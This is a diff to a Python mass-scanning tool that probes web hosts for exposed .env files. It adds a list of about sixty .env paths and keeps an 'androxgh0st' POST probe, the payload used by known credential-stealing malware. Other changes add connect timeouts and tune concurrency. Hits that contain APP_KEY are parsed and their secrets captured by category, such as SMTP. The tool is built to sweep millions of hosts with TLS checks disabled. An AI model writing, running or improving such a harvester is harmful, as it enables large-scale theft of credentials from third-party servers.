@@ -24,12 +24,80 @@ HEADERS = {
     "(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
 }
 DEFAULT_TIMEOUT = 7
+CONNECT_TIMEOUT = 3    # TCP handshake — host is dead or alive within 3 s
+                       # read timeout stays at DEFAULT_TIMEOUT (data transfer)
 DNS_TIMEOUT = 3           # seconds for DNS pre-check
 BATCH_SIZE = 2000         # futures in-flight at once  (memory-safe for 10M)
 PROGRESS_EVERY = 500      # report progress every N completions
 SESSION_SAVE_EVERY = 5000
 MAX_RESPONSE_BYTES = 2_097_152   # 2 MB — a real .env file is never larger
 SESSION_FILE = Path("config/session.json")
+
+# ── Known .env paths to probe ─────────────────────────────────────────────────
+ENV_PATHS: List[str] = [
+    "/.env",
+    "/backend/.env.dev",
+    "/backend/.env.local",
+    "/.env.qa",
+    "/config/.env",
+    "/src/.env.backup",
+    "/wordpress/.env",
+    "/portal/.env",
+    "/release/.env",
+    "/admin/.env.production",
+    "/conf/.env",
+    "/frontend/.env.local",
+    "/server/.env",
+    "/frontend/.env.production",
+    "/admin/.env",
+    "/frontend/.env.staging",
+    "/frontend/.env.prod",
+    "/services/auth/.env",
+    "/services/backend/.env",
+    "/backend/api/.env",
+    "/frontend/.env",
+    "/config/.env.local",
+    "/docker/.env",
+    "/app/.env.dev",
+    "/app/.env.old",
+    "/src/api/.env",
+    "/internal/.env",
+    "/backend/.env",
+    "/backend/.env.bak",
+    "/private/.env.production",
+    "/app/backend/.env",
+    "/internal/.env.production",
+    "/app/api/.env",
+    "/backend/.env.prod",
+    "/backend/.env.backup",
+    "/app/.env.bak",
+    "/backend/.env.production",
+    "/private/.env",
+    "/packages/api/.env",
+    "/backend/.env.old",
+    "/frontend/.env.backup",
+    "/build/.env",
+    "/server/.env.backup",
+    "/apps/frontend/.env",
+    "/laravel/.env",
+    "/apps/api/.env",
+    "/admin/.env.backup",
+    "/storage/.env",
+    "/config/.env.production",
+    "/deploy/.env",
+    "/dist/.env",
+    "/server/.env.local",
+    "/api/backend/.env",
+    "/tmp/.env",
+    "/symfony/.env",
+    "/src/.env.local",
+    "/cms/.env",
+    "/apps/backend/.env",
+    "/htdocs/.env",
+    "/uploads/.env",
+    "/admin/api/.env",
+    "/server/.env.production",
+]
 
 # ── Per-thread HTTP session pool ──────────────────────────────────────────────
 # One requests.Session per worker thread avoids lock contention on a shared
@@ -66,19 +134,26 @@ def _batched(iterable: Iterable, size: int) -> Generator:
 
 
 # ── DNS pre-check ─────────────────────────────────────────────────────────────
+# socket.setdefaulttimeout() mutates global process state — it is NOT thread-safe.
+# With hundreds of concurrent workers all saving/restoring the same global, threads
+# stomp on each other's saved values and lookups can block forever.
+# Fix: dedicate a small ThreadPoolExecutor so each future carries its own timeout
+# via future.result(timeout=…), leaving the global socket state untouched.
+_DNS_EXECUTOR: ThreadPoolExecutor = ThreadPoolExecutor(
+    max_workers=256, thread_name_prefix="dns_"
+)
+
 
 def _dns_resolves(host: str) -> bool:
     """Return True if the host resolves to at least one IP address."""
-    # Temporarily lower the global socket timeout just for getaddrinfo.
-    old = socket.getdefaulttimeout()
-    socket.setdefaulttimeout(DNS_TIMEOUT)
+    future = _DNS_EXECUTOR.submit(
+        socket.getaddrinfo, host, 80, socket.AF_UNSPEC, socket.SOCK_STREAM
+    )
     try:
-        socket.getaddrinfo(host, 80, socket.AF_UNSPEC, socket.SOCK_STREAM)
+        future.result(timeout=DNS_TIMEOUT)
         return True
-    except OSError:
+    except Exception:
         return False
-    finally:
-        socket.setdefaulttimeout(old)
 
 CATEGORY_PATTERNS: Dict[str, Dict[str, Any]] = {
     "SMTP": {
@@ -651,6 +726,7 @@ class ScanResult:
     details: str
     captures: Dict[str, str] = field(default_factory=dict)
     categories: List[str] = field(default_factory=list)  # ALL matched categories
+    probed_paths: List[str] = field(default_factory=list)  # env paths that were tried
 
 
 class Scanner:
@@ -672,6 +748,7 @@ class Scanner:
         self.timeout = timeout
         self.session_data: Dict[str, Any] = {}
         self.dns_check: bool = True   # toggle DNS pre-check
+        self.env_paths: List[str] = ["/.env"]  # default: only /.env
 
         self._stop_event = threading.Event()
         self._pause_event = threading.Event()
@@ -830,46 +907,86 @@ class Scanner:
                     return ScanResult(url=url, status="DEAD", category=None,
                                       details="DNS resolution failed", captures={})
 
-            # ── Primary .env probe ──────────────────────────────────────────────
+            # ── Primary .env probes (all selected paths) ────────────────────
             session = _get_session()
-            env_url = f"{url}/.env"
-            try:
-                response = self._request(session, env_url)
-            except requests.exceptions.Timeout:
-                return ScanResult(url=url, status="ERROR", category=None,
-                                  details="Timed out", captures={})
-            except requests.exceptions.SSLError as exc:
-                # SSLError is a subclass of ConnectionError — catch it first
-                return ScanResult(url=url, status="ERROR", category=None,
-                                  details=f"SSL error: {str(exc)[:80]}", captures={})
-            except requests.exceptions.TooManyRedirects:
-                return ScanResult(url=url, status="ERROR", category=None,
-                                  details="Too many redirects", captures={})
-            except requests.exceptions.ConnectionError as exc:
-                return ScanResult(url=url, status="ERROR", category=None,
-                                  details=f"Connection error: {str(exc)[:80]}", captures={})
-            except requests.exceptions.RequestException as exc:
-                return ScanResult(url=url, status="ERROR", category=None,
-                                  details=str(exc)[:120], captures={})
+            probed: List[str] = []
+            # Track whether the host returned ANY HTTP response across all paths.
+            # If False after the loop, every attempt timed out / threw an unknown
+            # exception — the host is unreachable and should be ERROR, not CLEAN.
+            any_http_success = False
+            # host_dead: set True on the FIRST connect-timeout so we abort all
+            # remaining paths instead of waiting full timeout × N paths.
+            host_dead = False
+            for env_path in self.env_paths:
+                if self._stop_event.is_set():
+                    return ScanResult(url=url, status="STOPPED", category=None,
+                                      details="Scan aborted", captures={},
+                                      probed_paths=probed)
+                if host_dead:
+                    # No point probing further paths on an unresponsive host
+                    break
+                env_url = f"{url}{env_path}"
+                probed.append(env_path)
+                try:
+                    response = self._request(session, env_url)
+                except requests.exceptions.ConnectTimeout:
+                    # TCP connect timed out — host is unreachable, skip all paths
+                    host_dead = True
+                    continue
+                except requests.exceptions.ReadTimeout:
+                    # Connected but read stalled — host IS alive, try next path
+                    any_http_success = True
+                    continue
+                except requests.exceptions.Timeout:
+                    # Generic timeout (connect or read) — treat as host dead
+                    host_dead = True
+                    continue
+                except requests.exceptions.SSLError as exc:
+                    # SSL errors affect the whole host — no point trying more paths
+                    return ScanResult(url=url, status="ERROR", category=None,
+                                      details=f"SSL error: {str(exc)[:80]}", captures={},
+                                      probed_paths=probed)
+                except requests.exceptions.TooManyRedirects:
+                    # Server IS reachable; redirects just looped for this path
+                    any_http_success = True
+                    continue
+                except requests.exceptions.ConnectionError as exc:
+                    # TCP-level failure — affects the whole host, abort
+                    return ScanResult(url=url, status="ERROR", category=None,
+                                      details=f"Connection error: {str(exc)[:80]}", captures={},
+                                      probed_paths=probed)
+                except requests.exceptions.RequestException:
+                    continue  # unknown per-path error; try next
 
-            if response is None:
-                # Response exceeded MAX_RESPONSE_BYTES — definitely not a .env file
-                return ScanResult(url=url, status="CLEAN", category=None,
-                                  details="Response too large (not a .env file)", captures={})
-            if response.status_code == 200 and "APP_KEY" in response.text:
-                return self.process_response(env_url, response)
+                # Reaching here means session.get() returned without exception
+                any_http_success = True
+                if response is None:
+                    continue  # oversized response — definitely not a .env
+                if response.status_code == 200 and "APP_KEY" in response.text:
+                    result = self.process_response(env_url, response)
+                    result.probed_paths = probed
+                    return result
 
             # ── Secondary androxgh0st probe (non-critical) ──────────────────────
-            # _request() for POST already catches all RequestExceptions and returns
-            # None, so no try/except needed here. Any other exception is a genuine
-            # programming error and will propagate to the outer handler.
             response2 = self._request(session, url, method="post",
                                       data={"0x[]": "androxgh0st"})
-            if response2 and "<td>APP_KEY</td>" in response2.text:
-                return self.process_response(url, response2)
+            if response2:
+                any_http_success = True
+                if "<td>APP_KEY</td>" in response2.text:
+                    result = self.process_response(url, response2)
+                    result.probed_paths = probed
+                    return result
+
+            # If no path ever returned an HTTP response the host is unreachable
+            if not any_http_success:
+                reason = "TCP connect timed out" if host_dead else "all paths timed out"
+                return ScanResult(url=url, status="DEAD", category=None,
+                                  details=f"Host unreachable ({reason})",
+                                  captures={}, probed_paths=probed)
 
             return ScanResult(url=url, status="CLEAN", category=None,
-                              details="No environment leakage detected", captures={})
+                              details="No environment leakage detected", captures={},
+                              probed_paths=probed)
         except Exception as exc:
             return ScanResult(url=url, status="ERROR", category=None,
                               details=str(exc)[:120], captures={})
@@ -895,14 +1012,14 @@ class Scanner:
         """
         if method == "post":
             try:
-                return session.post(url, timeout=self.timeout,
+                return session.post(url, timeout=(CONNECT_TIMEOUT, self.timeout),
                                     verify=False, allow_redirects=False, data=data)
             except requests.exceptions.RequestException:
                 # POST is a secondary probe — any network failure means skip it
                 return None
 
         # GET — follow redirects, stream body, cap at MAX_RESPONSE_BYTES
-        r = session.get(url, timeout=self.timeout, verify=False,
+        r = session.get(url, timeout=(CONNECT_TIMEOUT, self.timeout), verify=False,
                         allow_redirects=True, stream=True)
         # Reject by Content-Length header before downloading anything
         cl = r.headers.get("Content-Length", "")
